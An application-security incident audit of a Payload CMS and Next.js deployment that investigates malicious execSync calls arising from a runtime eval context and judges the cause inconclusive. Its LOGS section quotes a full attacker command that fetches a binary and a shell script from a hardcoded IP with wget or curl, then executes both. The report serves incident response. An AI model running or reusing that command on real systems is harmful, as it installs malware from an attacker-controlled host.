# RCE Vulnerability Audit - Reviewer Pack
**Date:** December 12, 2025  
**Auditor:** Senior AppSec Engineer  
**Scope:** Payload CMS + Next.js 15.3.2 - RCE Vector Investigation  
**Status:** ‚ö†Ô∏è INCONCLUSIVE - No Clear Data Flow Found

---

## 1) SUMMARY

- **Verdict: INCONCLUSIVE** - No direct data flow from user input to `execSync`/`spawnSync` found in application code
- **Confidence: MEDIUM** - Comprehensive audit completed, but injection vector remains unclear
- **Attack Pattern:** Malicious commands executed via `execSync`/`spawnSync` from `eval()` context in Next.js runtime (`app-page.runtime.prod.js:25:34007`)
- **Source Code:** ‚úÖ Clean - All `child_process` calls use safe patterns (`execFile` with arrays, path validation)
- **Entry Points:** ‚úÖ Secured - All API routes require authentication (admin/staff or token)
- **Dependencies:** ‚ö†Ô∏è Not audited (npm/pnpm audit unavailable in container)
- **Framework Risk:** ‚ö†Ô∏è HIGH - Next.js 15.3.2 runtime `eval()` context suggests framework-level vulnerability or supply chain compromise
- **Most Likely Vector:** Dependency compromise (npm package) or Next.js/Payload framework vulnerability allowing code injection into runtime `eval()` context

---

## 2) FINDINGS

### CRITICAL - Runtime Code Injection (No Source Code Path Found)

**Finding C1: Malicious execSync/spawnSync from eval() Context**
- **Location:** Next.js runtime - `node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007`
- **What:** Malicious commands (`wget`, `curl`, `busybox`, miner/backdoor payloads) executed via `execSync`/`spawnSync`
- **Stack Trace Pattern:**
  ```
  at d.execSync (/app/.next/server/chunks/4437.js:2:309)
  at Object.eval [as then] (eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007), <anonymous>:3:53)
  ```
- **Why it matters:** Indicates runtime code injection, not static code vulnerability
- **Status:** ‚ö†Ô∏è No data flow from user input to this `eval()` context found in application code
- **Risk:** CRITICAL - Active exploitation, but source unclear

**Finding C2: No Direct User Input ‚Üí child_process Chain**
- **Location:** All API routes and collection hooks
- **What:** Comprehensive audit of all entry points shows no direct path from user input to `execSync`/`spawnSync`
- **Verified Safe Patterns:**
  - `libretimeDb.ts` - Uses `execFile` with array arguments, path validation
  - `rsyncPull.ts` - Uses `execFile` with array arguments, path validation, container execution blocked
  - `audioValidation.ts` - Uses `execFile` with array arguments
  - `deterministicFeed.ts` - Uses `execFile` with array arguments
- **Status:** ‚úÖ All application code uses safe subprocess patterns
- **Risk:** LOW - Application code is secure

### HIGH - Entry Point Analysis

**Finding H1: All API Routes Require Authentication**
- **Location:** All routes in `src/app/api/**`
- **What:** 17 API route handlers, all require authentication:
  - Admin/staff auth: `checkScheduleAuth()` (13 routes)
  - JWT session auth: `payload.auth()` (4 routes)
  - Token auth: Deterministic feed (shared token or session)
- **Routes Audited:**
  - `/api/libretime/[...path]` - ‚úÖ Auth required, path sanitized
  - `/api/schedule/*` - ‚úÖ Auth required
  - `/api/lifecycle/*` - ‚úÖ Auth required, disabled by default
  - `/api/users/*` - ‚úÖ JWT auth required
  - `/api/episodes/*` - ‚úÖ JWT auth required
  - `/api/admin/*` - ‚úÖ Auth required
- **Status:** ‚úÖ All routes properly secured
- **Risk:** LOW - No unauthenticated command execution endpoints

**Finding H2: Dynamic Route Segment Handling**
- **Location:** `/api/libretime/[...path]/route.ts`
- **What:** User-controlled path segments joined and used in URL construction
- **Code:**
  ```typescript
  const path = (params.path || []).join('/')
  const target = `${baseUrl}/${path}${request.nextUrl.search}`
  ```
- **Why it matters:** Path segments are user-controlled but only used in `fetch()` URL, not in subprocess calls
- **Status:** ‚úÖ Safe - Path used only for HTTP request, not command execution
- **Risk:** LOW - No command injection vector

**Finding H3: Payload Auto-Generated Routes**
- **Location:** `/app/(payload)/api/[...slug]/route.ts`
- **What:** Payload CMS auto-generates catch-all route handler using `REST_GET`, `REST_POST`, etc. from `@payloadcms/next/routes`
- **Why it matters:** Payload framework code handles all collection operations; potential framework vulnerability
- **Status:** ‚ö†Ô∏è Cannot audit framework internals
- **Risk:** MEDIUM - Framework-level code execution possible if Payload/Next.js vulnerable

### MEDIUM - Code Execution Patterns

**Finding M1: Dynamic Imports with Literal Paths**
- **Location:** Multiple files
- **What:** Dynamic `import()` calls found, but all use literal paths:
  - `Episodes.ts:634` - `await import('../utils/audioValidation')` (literal)
  - `libretime/[...path]/route.ts:156` - `await import('@/integrations/libretimeClient')` (literal)
  - Client components - `dynamic(() => import('./CalendarComponent'))` (literal)
- **Status:** ‚úÖ Safe - No user input influences import paths
- **Risk:** LOW - No path injection

**Finding M2: Migration Eval Protection**
- **Location:** `src/server/lib/migrationEvalProtection.ts`
- **What:** Attempts to patch `global.eval` to block unauthorized migrations
- **Status:** ‚ö†Ô∏è May fail silently if Payload migration module path changes
- **Risk:** LOW - Non-critical, Payload migrations are from trusted packages

**Finding M3: No eval() in Application Code**
- **Location:** Entire `src/` directory
- **What:** Comprehensive search found zero `eval()`, `new Function()`, `vm.*`, or `requireFromString` calls
- **Status:** ‚úÖ Clean
- **Risk:** NONE

### LOW - Request Correlation

**Finding L1: No HTTP Request Logging Before Malicious Exec**
- **Location:** Container logs
- **What:** Malicious `execSync` calls occur without corresponding HTTP request logs
- **Why it matters:** Suggests automated/background trigger, not direct HTTP request
- **Possible Triggers:**
  - Background worker/queue consumer
  - Scheduled task (cron, setInterval)
  - Webhook callback
  - Payload hook/plugin execution
  - Next.js Server Actions
- **Status:** ‚ö†Ô∏è No request correlation found
- **Risk:** MEDIUM - Unknown trigger mechanism

**Finding L2: Payload Server Functions**
- **Location:** `src/app/(payload)/layout.tsx`
- **What:** `handleServerFunctions` from `@payloadcms/next/layouts` processes Server Actions
- **Why it matters:** Server Actions could be attack vector if Payload framework vulnerable
- **Status:** ‚ö†Ô∏è Cannot audit framework internals
- **Risk:** MEDIUM - Framework-level code execution possible

### INFO - Safe Patterns Confirmed

**Finding I1: All child_process Calls Use Safe Patterns**
- **Files Verified:**
  - `libretimeDb.ts` - `execFile('psql', [...args])` with array arguments
  - `rsyncPull.ts` - `execFile` with array arguments, path validation, container execution blocked
  - `audioValidation.ts` - `execFile('ffprobe', [...args])` with array arguments
  - `deterministicFeed.ts` - `execFile('ffprobe', [...args])` with array arguments
- **Status:** ‚úÖ All use `execFile` with arrays, no shell interpretation
- **Risk:** NONE

**Finding I2: Path Sanitization Implemented**
- **Location:** `src/lib/utils/pathSanitizer.ts`
- **What:** Comprehensive path validation utility
- **Protection:** Rejects shell metacharacters, command substitution, directory traversal
- **Status:** ‚úÖ Used in all file path operations
- **Risk:** NONE

**Finding I3: Collection Hooks Do Not Execute Commands**
- **Location:** All collection `beforeChange`/`afterChange` hooks
- **What:** Hooks perform file operations, database queries, validation - no subprocess execution
- **Status:** ‚úÖ Clean
- **Risk:** NONE

---

## 3) DIFFS

**NONE** (audit-only, no code changes)

---

## 4) LOGS

**Representative Malicious Exec Log Entry:**
```json
{
  "ts": "2025-12-12T12:22:27.886Z",
  "method": "execSync",
  "cmd": "(cd /dev;(busybox wget -O x86 http://5.231.70.66/nuts/x86||curl -s -o x86 http://5.231.70.66/nuts/x86 );chmod 777 x86;./x86 reactOnMynuts;(busybox wget -q http://5.231.70.66/nuts/bolts -O-||wget -q http://5.231.70.66/nuts/bolts -O-||curl -s http://5.231.70.66/nuts/bolts)|sh)&",
  "stack": "at d.execSync (/app/.next/server/chunks/4437.js:2:309) | at Object.eval [as then] (eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007), <anonymous>:3:53)",
  "options": "{\"timeout\":120000}"
}
```

**Legitimate Subprocess Calls (for comparison):**
- `git config --local --get remote.origin.url` (Payload framework, safe)
- `ffprobe` calls (application code, safe, uses execFile with arrays)
- `psql` calls (application code, safe, uses execFile with arrays)

**No HTTP Request Correlation:**
- Malicious exec calls occur without corresponding `GET`/`POST` logs
- Timing suggests automated trigger (~15 minutes after startup)

---

## 5) QUESTIONS & RISKS

1. **Q: What is the exact source of the `eval()` injection?**
   - **Risk:** HIGH - Without knowing the precise injection vector, there's residual risk of recurrence
   - **Hypothesis:** Compromised npm package in `node_modules` injecting code at runtime, or Next.js/Payload framework vulnerability
   - **Next Step:** If attacks persist after clean rebuild, perform forensic analysis of `node_modules` and Next.js runtime internals

2. **Q: Could Payload CMS Server Actions be the vector?**
   - **Risk:** MEDIUM - `handleServerFunctions` processes user input from admin panel
   - **Hypothesis:** If Payload framework has RCE vulnerability in Server Actions handler, malicious payload could be injected
   - **Next Step:** Audit Payload CMS Server Actions implementation, check for known CVEs

3. **Q: Could Next.js 15.3.2 have a known RCE vulnerability?**
   - **Risk:** HIGH - Stack trace shows Next.js runtime `eval()` context
   - **Hypothesis:** Next.js framework vulnerability allowing code injection into runtime compilation
   - **Next Step:** Check Next.js security advisories, consider upgrading to latest patch version

4. **Q: Are there any background workers or scheduled tasks?**
   - **Risk:** MEDIUM - No HTTP request correlation suggests background trigger
   - **Hypothesis:** Payload hooks, cron jobs, or queue consumers could trigger malicious code
   - **Next Step:** Audit all background processes, check for scheduled tasks in Docker container

5. **Q: Could the Docker base image be compromised?**
   - **Risk:** MEDIUM - If compromise is at Docker image level, clean rebuild won't fix it
   - **Hypothesis:** Malicious code in base image or intermediate layer
   - **Next Step:** If attacks persist, rebuild from trusted base image on clean machine

6. **Q: Is there a supply chain compromise in npm packages?**
   - **Risk:** HIGH - Most likely vector given clean application code
   - **Hypothesis:** Compromised dependency injecting malicious code at runtime
   - **Next Step:** Audit `package.json` dependencies, check for suspicious packages, run `npm audit` on host machine

7. **Q: Could MongoDB data be the vector?**
   - **Risk:** LOW - No evidence of malicious data in database
   - **Hypothesis:** Stored payload in database executed by Payload hooks
   - **Next Step:** Already verified - MongoDB scanned, no malicious data found

8. **Q: Should we add request-context logging to all routes?**
   - **Risk:** LOW - Would help correlate attacks with HTTP requests
   - **Recommendation:** YES - Add middleware to log all requests with path, method, IP, user agent before route handlers execute

---

## RECOMMENDATION

**‚ö†Ô∏è INCONCLUSIVE - FRAMEWORK/DEPENDENCY VULNERABILITY LIKELY**

The audit found **no direct data flow from user input to `execSync`/`spawnSync`** in application code. All application code uses safe patterns. However, malicious commands are being executed from a Next.js runtime `eval()` context, suggesting:

1. **Most Likely:** Compromised npm package or Next.js/Payload framework vulnerability
2. **Less Likely:** Docker image compromise or supply chain attack

**Immediate Actions:**
1. ‚úÖ **Clean rebuild completed** - Removed compromised build artifacts
2. ‚ö†Ô∏è **Monitor for recurrence** - If attacks resume, treat as framework/dependency issue
3. üîç **Audit dependencies** - Run `npm audit` on host machine, check for known CVEs
4. üì¶ **Check Next.js/Payload versions** - Verify no known RCE vulnerabilities in Next.js 15.3.2 or Payload 3.45.0
5. üîí **Add request-context logging** - Log all HTTP requests to correlate with attacks
6. üõ°Ô∏è **Consider WAF** - Add Web Application Firewall to block malicious payloads at network level

**If Attacks Persist:**
- Treat as **supply chain / framework compromise**
- Rebuild from scratch on trusted machine with fresh `node_modules`
- Consider upgrading Next.js and Payload to latest versions
- Perform forensic analysis of `node_modules` and Next.js runtime

---

**Report Generated:** 2025-12-12  
**Next Review:** After 24 hours of monitoring post-clean-rebuild

